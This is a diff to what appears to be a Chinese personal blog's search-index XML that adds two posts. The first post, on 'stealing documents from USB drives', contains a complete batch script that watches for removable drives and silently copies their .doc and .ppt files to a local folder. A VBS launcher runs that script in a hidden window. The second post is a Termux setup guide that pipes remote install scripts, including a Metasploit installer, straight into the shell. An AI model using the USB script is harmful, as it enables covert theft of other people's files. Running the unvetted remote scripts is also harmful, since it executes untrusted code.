@@ -3,6 +3,98 @@
   
     
     <entry>
+      <title><![CDATA[U盘文档偷取]]></title>
+      <url>/2018/05/28/bat-upan/</url>
+      <content type="html"><![CDATA[<p><img src="/2018/05/28/bat-upan/1.jpg" alt="">  </p>
+<h2 id="检测到插入U盘即复制其中doc、ppt文件到指定目录"><a href="#检测到插入U盘即复制其中doc、ppt文件到指定目录" class="headerlink" title="检测到插入U盘即复制其中doc、ppt文件到指定目录"></a>检测到插入U盘即复制其中doc、ppt文件到指定目录</h2><p>(ucopy.bat)：<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">:again</span><br><span class="line">del /Q /f &quot;%temp%\copy.tmp&quot; &gt;nul 2&gt;nul</span><br><span class="line">for %%i in (d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z) do @fsutil fsinfo drivetype %%i: &gt;&gt;&quot;%temp%\copy.tmp&quot;</span><br><span class="line">findstr /i &quot;可移动驱动器&quot; &quot;%temp%\copy.tmp&quot; </span><br><span class="line">if errorlevel==1 goto end</span><br><span class="line">if errorlevel==0 goto copy </span><br><span class="line">:end </span><br><span class="line">echo 不存在</span><br><span class="line">ping 127.0.0.1 -n 20 &gt;nul 2&gt;nul</span><br><span class="line">goto again</span><br><span class="line">:copy</span><br><span class="line">if exist c:\copy goto goon</span><br><span class="line">cd\</span><br><span class="line">cd /d c:</span><br><span class="line">md copy  </span><br><span class="line">:goon</span><br><span class="line">for /f &quot;tokens=1&quot; %%i in (&apos;findstr /i &quot;可移动驱动器&quot; &quot;%temp%\copy.tmp&quot;&apos;) do (</span><br><span class="line">for /f &quot;tokens=*&quot; %%j in (&apos;dir/s/b %%i\*.ppt %%i\*.doc?&apos;) do (</span><br><span class="line">copy %%j c:\copy /y))</span><br><span class="line">ping 127.0.0.1 -n 20 &gt;nul 2&gt;nul</span><br><span class="line">goto again</span><br></pre></td></tr></table></figure></p>
+<h2 id="隐藏bat进程"><a href="#隐藏bat进程" class="headerlink" title="隐藏bat进程"></a>隐藏bat进程</h2><p>(ucopy.vbs)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set ws=WScript.CreateObject(&quot;WScript.Shell&quot;) </span><br><span class="line">ws.Run &quot;u.bat&quot;,0</span><br></pre></td></tr></table></figure>
+<h2 id="执行ucopy-vbs"><a href="#执行ucopy-vbs" class="headerlink" title="执行ucopy.vbs"></a>执行ucopy.vbs</h2>]]></content>
+      
+        
+        <tags>
+            
+            <tag> Study </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[安卓终端-termux]]></title>
+      <url>/2018/05/26/termux-study/</url>
+      <content type="html"><![CDATA[<p><img src="/2018/05/26/termux-study/1.jpg" alt="">  </p>
+<h2 id="介绍与安装"><a href="#介绍与安装" class="headerlink" title="介绍与安装"></a>介绍与安装</h2><p>Termux - 在 Android 和 Chrome OS 上运行的 Android 终端模拟器</p>
+<a id="more"></a>
+<p>Termux是一个 Android 终端模拟器以及提供 Linux 环境的应用程序。跟许多其他应用程序不同，无需 root 设备也无需进行设置。它是开箱即用的！它会自动安装好一个最基本的 Linux 系统，当然也可以使用 APT 软件包管理器来安装其他软件包。总之，你可以让你的 Android 设备变成一台袖珍的 Linux 电脑。它不仅适用于 Android，并且可以在在 Chrome OS 上安装它。</p>
+<h2 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h2><p>1.显示扩展功能按键</p>
+<p>扩展功能键:ESC，CTR，TAB，ALT，-，/，|</p>
+<ul>
+<li>音量↑ + Q键 （推荐）</li>
+<li>从左向右滑动,显示隐藏式导航栏,长按左下角的KEYBOARD. </li>
+</ul>
+<p>2.Ctrl键是终端用户常用的按键 – 但大多数触摸键盘都没有这个按键。为此，Termux使用音量减小按钮来模拟Ctrl键。<br>例如，在触摸键盘上按音量减小+ L发送与在硬件键盘上按Ctrl + L相同的输入。</p>
+<pre><code>Ctrl+A -&gt; 将光标移动到行首
+Ctrl+C -&gt; 中止当前进程
+Ctrl+D -&gt; 注销终端会话
+Ctrl+E -&gt; 将光标移动到行尾
+Ctrl+K -&gt; 从光标删除到行尾
+Ctrl+L -&gt; 清除终端
+Ctrl+Z -&gt; 挂起（发送SIGTSTP到）当前进程
+</code></pre><p>3.音量加键也可以作为产生特定输入的特殊键.</p>
+<pre><code>音量加+E -&gt; Esc键
+音量加+T -&gt; Tab键
+音量加+1 -&gt; F1（和音量增加+ 2→F2等）
+音量加+0 -&gt; F10
+音量加+B -&gt; Alt + B，使用readline时返回一个单词
+音量加+F -&gt; Alt + F，使用readline时转发一个单词
+音量加+X -&gt; Alt+X
+音量加+W -&gt; 向上箭头键
+音量加+A -&gt; 向左箭头键
+音量加+S -&gt; 向下箭头键
+音量加+D -&gt; 向右箭头键
+音量加+L -&gt; | （管道字符）
+音量加+H -&gt; 〜（波浪号字符）
+音量加+U -&gt; _ (下划线字符)
+音量加+P -&gt; 上一页
+音量加+N -&gt; 下一页
+音量加+. -&gt; Ctrl + \（SIGQUIT）
+音量加+V -&gt; 显示音量控制
+音量加+Q -&gt; 显示额外的按键视图
+</code></pre><h2 id="安装基本工具"><a href="#安装基本工具" class="headerlink" title="安装基本工具"></a>安装基本工具</h2><pre><code>pkg update
+pkg install vim curl wget git unzip unrar
+</code></pre><p>python,pip</p>
+<pre><code>pkg install python
+curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
+python get-pip.py
+pkg install python-dev clang fftw
+</code></pre><p>openssh</p>
+<pre><code>pkg install openssh
+</code></pre><p>mysql</p>
+<pre><code>pkg install mariadb    #打开一个窗口输入mysql
+</code></pre><p>Metasploit</p>
+<pre><code>wget https://Auxilus.github.io/metasploit.sh
+bash metasploit.sh
+</code></pre><h2 id="终端优化-zsh-shell"><a href="#终端优化-zsh-shell" class="headerlink" title="终端优化(zsh shell)"></a>终端优化(zsh shell)</h2><pre><code>sh -c &quot;$(curl -fsSL https://github.com/Cabbagec/termux-ohmyzsh/raw/master/install.sh)&quot;
+</code></pre><p>分别选择背景色和字体<br>想要继续更改挑选配色的话,继续运行脚本来再次筛选:</p>
+<pre><code>$ ~/termux-ohmyzsh/install.sh
+</code></pre><p>zsh安装配置完成后会在home目录生成storage目录，并且生成若干目录，软连接都指向外置存储卡的相应目录,有利于设置软链接</p>
+<h2 id="创建文件夹软连接"><a href="#创建文件夹软连接" class="headerlink" title="创建文件夹软连接"></a>创建文件夹软连接</h2><p>QQ</p>
+<pre><code>ln -s /data/data/com.termux/files/home/storage/shared/tencent/QQfile_recv QQ
+</code></pre><p>微信</p>
+<pre><code>ln -s /data/data/com.termux/files/home/storage/shared/tencent/MicroMsg/Download WX
+</code></pre>]]></content>
+      
+        
+        <tags>
+            
+            <tag> Study </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[堆学习（一）]]></title>
       <url>/2018/05/02/heap-study/</url>
       <content type="html"><![CDATA[<p><img src="/2018/05/02/heap-study/1.jpg" alt=""><br><a id="more"></a></p>
@@ -150,7 +242,8 @@ from pip._internal import main
     <entry>
       <title><![CDATA[Xman冬令营writeup]]></title>
       <url>/2018/01/07/wp-xmandly/</url>
-      <content type="html"><![CDATA[<p><img src="/2018/01/07/wp-xmandly/tt.jpg" alt=""><br>做题一时爽，期末火葬场，一晚上水了三题，跪求期末不挂，老老实实去复习。祝各位表哥冬令营玩的开心。<br><a id="more"></a></p>
+      <content type="html"><![CDATA[<hr>
+<p><img src="/2018/01/07/wp-xmandly/tt.jpg" alt=""><br>做题一时爽，期末火葬场，一晚上水了三题，跪求期末不挂，老老实实去复习。祝各位表哥冬令营玩的开心。<br><a id="more"></a></p>
 <h1 id="中二的成长之路"><a href="#中二的成长之路" class="headerlink" title="中二的成长之路"></a>中二的成长之路</h1><p><img src="/2018/01/07/wp-xmandly/1.jpg" alt=""><br>很容易发现图片本身就是个压缩包，里面还有个图片，但是加密了<br><img src="/2018/01/07/wp-xmandly/1.png" alt=""><br>所以需要我们求出压缩包的密码。<br>观察图片，有个二维码，扫描得到密文3ukka4wZf2Q9H8PEI5YKFA==<br>继续观察图片</p>
 <ol>
 <li>有红色字样，写着aes，说明是AES加密</li>
@@ -166,6 +259,14 @@ from pip._internal import main
 <p>好像是第四个，忘了。  </p>
 <embed src="http://www.xiami.com/widget/0_1317858/singlePlayer.swf" type="application/x-shockwave-flash" width="257" height="33" wmode="transparent">]]></content>
       
+        
+        <tags>
+            
+            <tag> ctf </tag>
+            
+            <tag> writeup </tag>
+            
+        </tags>
         
     </entry>
     
@@ -699,9 +800,9 @@ from pip._internal import main
         
         <tags>
             
-            <tag> 爬虫 </tag>
-            
             <tag> Study </tag>
+            
+            <tag> 爬虫 </tag>
             
         </tags>
         
@@ -1150,9 +1251,9 @@ from pip._internal import main
         
         <tags>
             
-            <tag> 警察 </tag>
-            
             <tag> 摘录 </tag>
+            
+            <tag> 警察 </tag>
             
         </tags>
         
